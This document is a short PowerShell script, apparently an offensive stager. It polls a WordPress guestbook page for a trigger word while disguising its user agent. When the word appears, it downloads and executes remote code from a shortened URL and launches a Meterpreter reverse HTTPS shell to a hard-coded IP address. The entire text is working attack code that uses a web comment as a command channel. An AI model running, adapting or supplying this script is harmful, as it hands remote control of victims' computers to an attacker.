$Word = 'mail'
$WebClientObject = New-Object Net.WebClient
$comment = "http://jurisquebec.wordpress.com/livre-dor/"
$WebClientObject.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36") 
While($True){
$CommentResult = $WebClientObject.DownloadString($comment)
$Found = $CommentResult.contains($Word)
If($Found) {
IEX $WebClientObject.DownloadString('http://goo.gl/XNWAvo')
Invoke-Shellcode -Payload windows/meterpreter/reverse_https -LHOST 178.62.116.123 -LPORT 7777 -Force
Return
}
Start-Sleep -Seconds 30
}
